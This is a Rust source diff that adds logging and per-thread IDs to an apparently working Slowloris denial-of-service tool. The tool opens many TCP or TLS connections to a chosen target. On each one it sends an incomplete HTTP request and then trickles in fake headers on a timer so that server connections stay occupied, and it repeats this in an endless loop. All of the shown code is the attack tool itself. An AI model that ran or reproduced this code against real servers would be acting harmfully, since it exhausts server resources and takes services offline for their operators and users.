@@ -4,6 +4,8 @@
 extern crate docopt;
 extern crate rustc_serialize;
 extern crate openssl;
+#[macro_use] extern crate log;
+extern crate env_logger;
 
 use docopt::Docopt;
 use std::net::TcpStream;
@@ -74,38 +76,42 @@ impl Target {
 /// `timeout` is the total time for the attack to progress, in milliseconds.
 /// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
 /// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
-fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool) {
+/// `threadn` is the thread number of this thread.
+fn request_attack<T: Sized + Read + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
     // Start a valid HTTP request
     let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
     connection.write_all(initial_request)
-        .expect("[REQUEST] !!! Couldn't write GET request.");
-    println!("[REQUEST] Wrote {} request.", if post {"POST"} else {"GET"});
+        .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write GET request: {}", threadn, e); panic!();});
+    info!("[REQUEST:{}] Wrote {} request.", threadn, if post {"POST"} else {"GET"});
 
     // Delay cycle
     // Conditional here limits requests to one per ten milliseconds
     let real_cycles = if cycles < timeout/10 {cycles} 
-                      else {println!("[REQUEST] Too many cycles! Limiting."); timeout/10};
-    println!("[REQUEST] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", timeout, real_cycles, timeout/real_cycles);
+                      else {info!("[REQUEST] Too many cycles! Limiting."); timeout/10};
+    info!("[REQUEST:{}] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", threadn, timeout, real_cycles, timeout/real_cycles);
     for _ in 0..(real_cycles) {
         // Timeout / cycles gives the number of ms for one cycle
         sleep_ms(timeout / cycles);
         connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
-            .expect("[REQUEST] !!! Couldn't write fake header.");
+            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write header. {}", threadn, e); panic!();});
     }
 
     if finalize {
         connection.write_all(b"\r\n")
-            .expect("[REQUEST] !!! Couldn't write finalizer");
-        println!("[REQUEST] Wrote finalizer.");
+            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e); panic!();});
+        info!("[REQUEST:{}] Wrote finalizer.", threadn);
         let mut res = vec![];
-        connection.read_to_end(&mut res).unwrap();
-        println!("[REQUEST] Response length: {}", res.len());
+        connection.read_to_end(&mut res).unwrap_or_else(|e| {error!("[REQUEST:{}] Failed to read response. {}", threadn, e); panic!();});
+        debug!("[REQUEST:{}] Response length: {}", threadn, res.len());
     } else {
-        println!("[REQUEST] Terminating without finalizer.");
+        info!("[REQUEST:{}] Terminating without finalizer.", threadn);
     }
 }
 
 fn main() {
+    // Set up logging
+    env_logger::init().unwrap();
+    debug!("Logging successfully initialized.");
     let args: Args = Docopt::new(USAGE)
                             .and_then(|d| d.decode())
                             .unwrap_or_else(|e| e.exit());
@@ -129,30 +135,32 @@ fn main() {
         target.set_domain(&domain);
     }
 
-    println!("[CONTROL] Target: {:?}", target);
-
     loop {
+        println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
+        println!("\tThis is expected to take {} seconds.", timeout as f32/1000.0);
         let mut handles = Vec::with_capacity(threads);
-        for _ in 0..threads {
+        for threadn in 0..threads {
             let target = target.clone();
             handles.push(
                 thread::spawn(move || {
                     // Attempt to connect to the target.
-                    let mut tcp_stream = TcpStream::connect(target.get_designator()).expect("[CONTROL] !!! Couldn't connect. Aborting.");
-                    println!("[CONTROL] Succesfully connected to {}.", target.get_designator());
+                    let mut tcp_stream = TcpStream::connect(target.get_designator())
+                        .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
+                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                     // If needed, connect SSL to the target.
                     if ssl {
                         // Attempt to set up SSL
                         let connector = SslConnectorBuilder::new(SslMethod::tls())
-                            .expect("[CONTROL] !!! Failed to build SSL functionality.")
+                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Failed to build SSL functionality. {}", threadn, e); panic!();})
                             .build();
-                        println!("[CONTROL] Built SSL functionality.");
-
-                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream).expect("[CONTROL] !!! Couldn't connect TLS. Did you provide a domain name, not an IP?");
-                        println!("[CONTROL] Successfully connected with TLS.");
-                        request_attack(&mut ssl_stream, timeout, cycles, finalize, post);
+                        debug!("[CONTROL:{}] Built SSL functionality.", threadn);
+                        // Attempt to connect SSL
+                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
+                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
+                        info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
+                        request_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
                     } else {
-                        request_attack(&mut tcp_stream, timeout, cycles, finalize, post)
+                        request_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
                     }
                 })
             );
